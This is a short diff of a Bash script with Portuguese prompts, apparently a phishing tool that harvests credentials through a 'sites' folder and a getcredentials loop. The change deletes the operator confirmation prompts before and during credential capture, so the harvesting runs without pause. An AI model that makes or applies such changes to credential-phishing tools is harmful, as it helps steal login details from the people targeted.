@@ -93,12 +93,6 @@ stop() {
 }
 
 start() {
-  read -p $'[*] Deseja iniciar a captura de credenciais? (s/n): ' start_capture
-  if [[ "$start_capture" != "s" ]]; then
-    printf "[!] Captura cancelada pelo usuário.\n"
-    exit 1
-  fi
-
   if [ ! -d "sites" ]; then
     mkdir sites
   fi
@@ -153,13 +147,6 @@ start() {
     
     # Aguardar a captura de credenciais
     getcredentials
-
-    # Perguntar se deseja continuar a captura
-    read -p $'[*] Deseja continuar a captura de credenciais? (s/n): ' continue_capture
-    if [[ "$continue_capture" != "s" ]]; then
-      printf "[!] Captura encerrada pelo usuário.\n"
-      exit 1
-    fi
   done
 }
 
